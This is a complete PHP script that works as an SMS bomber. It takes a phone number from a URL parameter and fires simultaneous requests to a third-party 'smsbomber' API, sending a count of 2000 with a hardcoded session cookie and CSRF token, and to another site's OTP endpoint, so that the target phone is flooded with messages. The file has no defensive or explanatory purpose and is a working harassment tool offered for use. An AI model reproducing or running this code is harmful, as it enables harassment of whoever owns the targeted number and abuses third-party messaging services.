<?php
session_start();

if (isset($_GET['number']) && !empty($_GET['number'])) {

    $number = trim($_GET['number']);

    if (!isset($_SESSION['curr_count'])) {
        $_SESSION['curr_count'] = 0;
    }
    $_SESSION['curr_count']++;
    $curr_count = $_SESSION['curr_count'];

    $phpSessId = "bc8383f489c383220ac12f6da21b35d3";
    $csrfToken = "18c22cc84b4a6c33079909711fe9027a0f8ababe31fed5024e3d364b91841ae0";

    $jsonPayload1 = json_encode([
        "count" => 2000,
        "country_code" => "91",
        "csrf_token" => $csrfToken,
        "curr_count" => $curr_count,
        "mobile" => $number,
        "request_type" => "sms_bomber"
    ]);

    $ch1 = curl_init("https://greatonlinetools.com/smsbomber/endpoints/api/receive_number.php");
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch1, CURLOPT_POST, true);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, $jsonPayload1);
    curl_setopt($ch1, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "X-Requested-With: XMLHttpRequest",
        "Origin: https://greatonlinetools.com",
        "Referer: https://greatonlinetools.com/smsbomber/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    ]);
    curl_setopt($ch1, CURLOPT_COOKIE, "PHPSESSID=" . $phpSessId);
    curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch1, CURLOPT_TIMEOUT, 30);

    $postData2 = http_build_query([
        'mobilenumber' => $number,
        'email' => 'test@example.com'
    ]);

    $ch2 = curl_init("https://www.phonebazaar.info/send-otp.php");
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $postData2);
    curl_setopt($ch2, CURLOPT_HTTPHEADER, [
        "Content-Type: application/x-www-form-urlencoded"
    ]);
    curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch2, CURLOPT_TIMEOUT, 30);

    $mh = curl_multi_init();
    curl_multi_add_handle($mh, $ch1);
    curl_multi_add_handle($mh, $ch2);

    $running = null;
    do {
        curl_multi_exec($mh, $running);
        usleep(10000);
    } while ($running > 0);

    $response1 = curl_multi_getcontent($ch1);
    $response2 = curl_multi_getcontent($ch2);

    curl_multi_remove_handle($mh, $ch1);
    curl_multi_remove_handle($mh, $ch2);
    curl_multi_close($mh);
    
    curl_close($ch1);
    curl_close($ch2);

    header('Content-Type: application/json');
    echo json_encode([
        "success" => true,
        "data" => [
            "phone" => $number,
            "curr_count" => $curr_count,
            "total_sent" => $curr_count,
            "greatonlinetools" => json_decode($response1, true) ?: $response1,
            "phonebazaar" => json_decode($response2, true) ?: $response2
        ]
    ]);

} else {
    header('Content-Type: application/json');
    echo json_encode([
        "success" => false,
        "error" => "Phone number is required",
        "usage" => "?number=98xxxxxxxx"
    ]);
}
?>
